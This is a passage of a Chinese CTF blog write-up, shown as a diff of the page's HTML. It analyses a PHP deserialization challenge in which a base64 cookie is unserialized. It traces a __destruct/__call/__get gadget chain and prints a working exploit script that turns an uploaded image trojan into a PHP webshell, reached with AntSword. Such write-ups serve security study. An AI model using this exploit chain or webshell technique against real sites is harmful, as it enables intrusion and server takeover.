class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"home"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile) &amp;&amp; !<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cookie(<span class="string">"user"</span>,<span class="keyword">null</span>);</span><br><span class="line">        $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>接下来我们开始分析源码<br>首先我们题目入手时应该寻找可控的输入点，经过一番寻找后，在index.php中发现了cookie的反序列化操作<br><img src="https://upload-images.jianshu.io/upload_images/13385151-af170becce9d136b.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.jpg"></p>
+<p>cookie是我们可以控制的，所以可以以此为突破口进行进一步分析，题目登陆后有文件上传功能，我们重点看一下Profile.php中的代码<br>在upload_img()函数中，发现了如下代码段<br><img src="https://upload-images.jianshu.io/upload_images/13385151-bf333befc23d01f4.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.jpg"><br>当全局变量$_FILES 不为空时，我们上传的文件会先保存为临时文件，然后在复制到upload文件夹下，这里会注意到，由于filename_tmp和filename均为public属性，我们可以控制这两个变量，将临时文件控制为我们想要上传的木马文件<br>接下来我们要做的事就是触发upload_img函数，继续分析源码注意到Register.php中的destruct方法<br><img src="https://upload-images.jianshu.io/upload_images/13385151-055b845bf9ac96bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br>在这里我们同样可以控制checker为Profile类的一个对象，这样由于Profile中没有index方法，就会触发Profile中的<strong>call方法<br><img src="https://upload-images.jianshu.io/upload_images/13385151-3a60637afcfe7405.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>在</strong>call方法中我们注意到</p>
+<pre><code>$this-&gt;{$name}
+
+相当于
+
+$this-&gt;index
+</code></pre><p>这样进而会触发__get方法<br><img src="https://upload-images.jianshu.io/upload_images/13385151-92a473306d6aea37.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"><br>同样对于expect我们是可以控制的，我们可以控制expect为upload_img进而调用该函数达到恶意文件的生成<br>最后我们来看upload_img函数，我们需要绕过两个判断<br><img src="https://upload-images.jianshu.io/upload_images/13385151-be6c514af8312d53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"><br>这两处相对来说比较简单了，checker是可控的，我们直接置0就可以了，对于第二个if我们在利用时不用上传文件所以就直接绕过了<br>最后梳理一下反序列化利用链</p>
+<pre><code>__destruct()--&gt;__call()--&gt;__get()--&gt;upload_img()
+</code></pre><h1 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h1><p>注册账号，登录，然后制作图片马上传，得到我们要copy”临时文件”的路径<br><img src="https://upload-images.jianshu.io/upload_images/13385151-8f79b9129a7fe81f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-75e33117a150f99a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>然后经过上面的分析我们可以构造出如下的漏洞利用代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$yml = <span class="keyword">new</span> Register();</span><br><span class="line">$yml-&gt;registed=<span class="number">0</span>;</span><br><span class="line">$yml-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$yml-&gt;checker-&gt;except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line">$yml-&gt;checker-&gt;checker=<span class="number">0</span>;</span><br><span class="line">$yml-&gt;checker-&gt;ext=<span class="number">1</span>;</span><br><span class="line">$yml-&gt;checker-&gt;filename_tmp=<span class="string">"./upload/a7a3cba0eead18324c8b3e2f013dea71/97fa7719c9699fdb67790374376816ba.png"</span>;</span><br><span class="line">$yml-&gt;checker-&gt;filename=<span class="string">"./upload/a7a3cba0eead18324c8b3e2f013dea71/yemoli.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($yml));</span><br></pre></td></tr></table></figure></p>
+<p>我们需要修改cookie的值，所以base64编码一下<br><img src="https://upload-images.jianshu.io/upload_images/13385151-358147a2a393243e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"><br>成功的生成的我们需要的一句话<br><img src="https://upload-images.jianshu.io/upload_images/13385151-639d738016015774.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"></p>
+<p>蚂蚁连接一下<br><img src="https://upload-images.jianshu.io/upload_images/13385151-fa66c4aa8e8dbb26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>感觉如果对于魔法函数熟悉的话，题目上手不会太难，后续计划总结一下各个魔法函数的特性，这样对于反序列化题目会更得心应手一些。</p>
+<p>参考链接：<br><a href="https://chxing.xyz/2019/05/27/QWB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" target="_blank" rel="noopener">https://chxing.xyz/2019/05/27/QWB反序列化</a></p>
+<p><a href="https://altman.vip/2019/05/27/QWB2019-writeup/" target="_blank" rel="noopener">https://altman.vip/2019/05/27/QWB2019-writeup/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="夜莫离、 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="夜莫离、 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/24/PHP无参数实现RCE/" rel="next" title="PHP无参数实现RCE">
+                <i class="fa fa-chevron-left"></i> PHP无参数实现RCE
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">夜莫离、</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yemoli" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chxing.xyz/" title="Bling_Dog" target="_blank">Bling_Dog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.smi1e.top/" title="Smi1e" target="_blank">Smi1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://altman.vip/" title="Altman" target="_blank">Altman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.virtua1.cn/" title="Virtua1" target="_blank">Virtua1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="赵" target="_blank">赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cdusec.com/" title="CDUSEC" target="_blank">CDUSEC</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cdusec.happyhacking.top/" title="CDUSEC内部博客" target="_blank">CDUSEC内部博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jjhpkcr.xyz/" title="江江河畔砍柴人" target="_blank">江江河畔砍柴人</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.youknowi.xin/" title="图先生" target="_blank">图先生</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a3ura.github.io/" title="a3ura" target="_blank">a3ura</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.recorday.cn/" title="C0d3r1iu" target="_blank">C0d3r1iu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.iloveflag.com/" title="醉梦半醒" target="_blank">醉梦半醒</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#源码分析"><span class="nav-number">1.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实战利用"><span class="nav-number">2.</span> <span class="nav-text">实战利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">夜莫离、</span>
+
+  
+</div>
+
+
+  <!-- <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div> 
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>-->
+
+
+
+<div class="theme-info">
+ <div class="powered-by"></div>
+ <span class="post-count">博客全站共43k字</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
